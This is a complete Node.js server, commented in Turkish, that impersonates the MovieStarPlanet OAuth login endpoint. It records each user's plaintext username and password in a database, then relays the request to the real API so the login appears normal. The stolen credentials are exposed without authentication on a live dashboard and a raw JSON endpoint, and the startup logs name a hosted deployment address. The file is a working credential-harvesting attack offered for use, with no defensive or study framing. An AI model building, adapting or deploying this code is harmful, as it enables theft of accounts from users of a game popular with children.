const express = require('express');
const cors = require('cors');
const db = require('./lib/supabase');

const app = express();
const PORT = process.env.PORT || 3001;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Ana sayfa
app.get('/', (req, res) => {
  res.json({ 
    message: 'OAuth Token Proxy Server (Database Version) - MSP API Proxy',
    endpoints: {
      proxy: '/loginidentity/connect/token - POST OAuth token proxy (MSP API)',
      save: '/save - POST username, password, jwt kaydetmek için',
      json: '/json - Kaydedilen verileri görüntüle',
      api: '/api/credentials.json - Ham JSON verisi',
      health: '/health - Server durumu'
    },
    usage: {
      msp_api: 'POST /loginidentity/connect/token ile MSP API\'sine proxy yapın',
      credentials: 'Username ve password otomatik olarak kaydedilir',
      view_data: 'GET /json ile kaydedilen verileri görüntüleyin'
    },
    timestamp: new Date().toISOString()
  });
});

// Kullanıcı adı ve şifre kaydetme endpoint'i
app.post('/save', async (req, res) => {
  const { username, password, jwt } = req.body;
  
  console.log('💾 Veri kaydediliyor:', {
    username: username || 'YOK',
    password: password ? '****' : 'YOK',
    jwt: jwt ? 'TOKEN_VAR' : 'YOK',
    timestamp: new Date().toISOString()
  });
  
  if (!username || !password) {
    return res.status(400).json({ 
      error: 'Username ve password gerekli',
      received: { username: !!username, password: !!password }
    });
  }
  
  try {
    const saved = await db.saveLoginAttempt(username, password, jwt);
    console.log('✅ Veri başarıyla kaydedildi:', saved.id);
    
    res.json({ 
      success: true, 
      message: 'Veriler kaydedildi',
      id: saved.id,
      timestamp: saved.timestamp
    });
  } catch (error) {
    console.error('❌ Kaydetme hatası:', error);
    res.status(500).json({ error: 'Kaydetme hatası: ' + error.message });
  }
});

// OAuth Token Proxy Endpoint - Gerçek API'yi taklit eder
app.post('/loginidentity/connect/token', async (req, res) => {
  const { username, password, client_id, client_secret, grant_type, scope, acr_values } = req.body;
  
  console.log('🔐 OAuth Token isteği yakalandı:', {
    username: username || 'YOK',
    password: password ? '****' : 'YOK',
    client_id: client_id || 'YOK',
    grant_type: grant_type || 'YOK',
    timestamp: new Date().toISOString()
  });
  
  // Username ve password varsa kaydet
  if (username && password) {
    try {
      const saved = await db.saveLoginAttempt(username, password, null);
      console.log('✅ Login bilgileri kaydedildi:', saved.id);
    } catch (error) {
      console.error('❌ Kaydetme hatası:', error);
    }
  }
  
  // Gerçek API'ye istek gönder
  try {
    const fetch = (await import('node-fetch')).default;
    const response = await fetch('https://eu-secure.mspapis.com/loginidentity/connect/token', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'UnityPlayer/2022.3.21f1 (UnityWebRequest/1.0, libcurl/8.5.0-DEV)',
        'Accept': '*/*',
        'Accept-Encoding': 'deflate, gzip'
      },
      body: new URLSearchParams({
        client_id: client_id || 'unity.client',
        client_secret: client_secret || 'secret',
        grant_type: grant_type || 'password',
        scope: scope || 'openid nebula offline_access',
        username: username || '',
        password: password || '',
        acr_values: acr_values || ''
      })
    });
    
    const data = await response.text();
    
    // Response'u client'a geri gönder
    res.status(response.status);
    res.set(response.headers.raw());
    res.send(data);
    
    console.log('📤 API yanıtı gönderildi:', response.status);
    
  } catch (error) {
    console.error('❌ API Proxy hatası:', error);
    res.status(500).json({ 
      error: 'connection_error',
      error_description: 'Bağlantı hatası oluştu'
    });
  }
});

// JSON formatında verileri görüntüle (web sayfası)
app.get('/json', async (req, res) => {
  try {
    const attempts = await db.getLoginAttempts();
    
    const html = `
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Kaydedilen Veriler</title>
        <style>
            body {
                font-family: 'Courier New', monospace;
                background: #1a1a1a;
                color: #00ff00;
                margin: 0;
                padding: 20px;
                line-height: 1.6;
            }
            .container {
                max-width: 1200px;
                margin: 0 auto;
            }
            .header {
                text-align: center;
                margin-bottom: 30px;
                padding: 20px;
                border: 2px solid #00ff00;
                border-radius: 10px;
                background: rgba(0, 255, 0, 0.1);
            }
            .json-container {
                background: #000;
                border: 1px solid #333;
                border-radius: 8px;
                padding: 20px;
                overflow-x: auto;
                white-space: pre-wrap;
                font-size: 14px;
            }
            .stats {
                display: flex;
                justify-content: space-around;
                margin-bottom: 20px;
                flex-wrap: wrap;
            }
            .stat-box {
                background: rgba(0, 255, 0, 0.1);
                border: 1px solid #00ff00;
                padding: 15px;
                border-radius: 8px;
                text-align: center;
                margin: 5px;
                min-width: 150px;
            }
            .refresh-btn {
                background: #00ff00;
                color: #000;
                border: none;
                padding: 10px 20px;
                border-radius: 5px;
                cursor: pointer;
                font-weight: bold;
                margin: 10px;
            }
            .refresh-btn:hover {
                background: #00cc00;
            }
            .copy-btn {
                background: #0066ff;
                color: white;
                border: none;
                padding: 8px 16px;
                border-radius: 5px;
                cursor: pointer;
                margin-bottom: 10px;
            }
            .copy-btn:hover {
                background: #0052cc;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🔐 KAYDEDİLEN VERİLER (DATABASE)</h1>
                <p>Kullanıcı Adı ve Şifre Kayıtları - Kalıcı Depolama</p>
                <button class="refresh-btn" onclick="window.location.reload()">🔄 Yenile</button>
            </div>
            
            <div class="stats">
                <div class="stat-box">
                    <h3>Toplam Kayıt</h3>
                    <div style="font-size: 24px; font-weight: bold;">${attempts.length}</div>
                </div>
                <div class="stat-box">
                    <h3>Token'lı Kayıt</h3>
                    <div style="font-size: 24px; font-weight: bold; color: #00ff00;">${attempts.filter(a => a.jwt).length}</div>
                </div>
                <div class="stat-box">
                    <h3>Son Güncelleme</h3>
                    <div style="font-size: 14px;">${new Date().toLocaleString('tr-TR')}</div>
                </div>
            </div>
            
            <button class="copy-btn" onclick="copyToClipboard()">📋 JSON'u Kopyala</button>
            
            <div class="json-container" id="jsonData">${JSON.stringify(attempts, null, 2)}</div>
        </div>
        
        <script>
            function copyToClipboard() {
                const jsonData = document.getElementById('jsonData').textContent;
                navigator.clipboard.writeText(jsonData).then(function() {
                    alert('JSON verisi panoya kopyalandı!');
                }, function(err) {
                    console.error('Kopyalama hatası: ', err);
                });
            }
            
            // 30 saniyede bir otomatik yenile
            setTimeout(function() {
                window.location.reload();
            }, 30000);
        </script>
    </body>
    </html>
    `;
    
    res.send(html);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Ham JSON endpoint
app.get('/api/credentials.json', async (req, res) => {
  try {
    const attempts = await db.getLoginAttempts();
    res.setHeader('Content-Type', 'application/json');
    res.json(attempts);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Health check
app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    database: 'Connected',
    storage: 'Supabase PostgreSQL',
    timestamp: new Date().toISOString(),
    uptime: process.uptime()
  });
});

// Sunucuyu başlat
async function startServer() {
  // Test database connection
  const dbConnected = await db.testConnection();
  if (!dbConnected) {
    console.error('❌ Database connection failed. Please check your Supabase configuration.');
    process.exit(1);
  }
  
  app.listen(PORT, () => {
    console.log(`🚀 MSP OAuth Proxy Server çalışıyor: ${PORT}`);
    console.log(`🔐 MSP API Proxy: POST https://accounts-vxlw.onrender.com/loginidentity/connect/token`);
    console.log(`📊 Veriler: https://accounts-vxlw.onrender.com/json`);
    console.log(`💾 Kaydetme: POST https://accounts-vxlw.onrender.com/save`);
    console.log(`🗄️  Database: Supabase PostgreSQL (Kalıcı Depolama)`);
    console.log('');
    console.log('📝 MSP API Proxy Kullanımı:');
    console.log('1. MSP uygulamasını bu sunucuya yönlendirin');
    console.log('2. POST /loginidentity/connect/token endpoint\'ini kullanın');
    console.log('3. Username ve password otomatik kaydedilir');
    console.log('4. GET /json ile kaydedilen verileri görün');
  });
}

startServer().catch(console.error);
